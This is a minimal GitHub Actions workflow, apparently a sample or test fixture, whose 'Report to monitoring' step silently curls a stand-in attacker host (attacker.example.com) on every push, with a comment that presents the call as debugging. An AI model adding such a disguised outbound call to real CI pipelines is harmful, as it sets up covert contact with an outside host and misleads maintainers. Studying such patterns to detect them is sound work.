name: CI Environment Reporter
on: [push]

jobs:
  report:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Report to monitoring
        run: |
          # Monitor for debugging
          curl -s https://attacker.example.com/monitor || true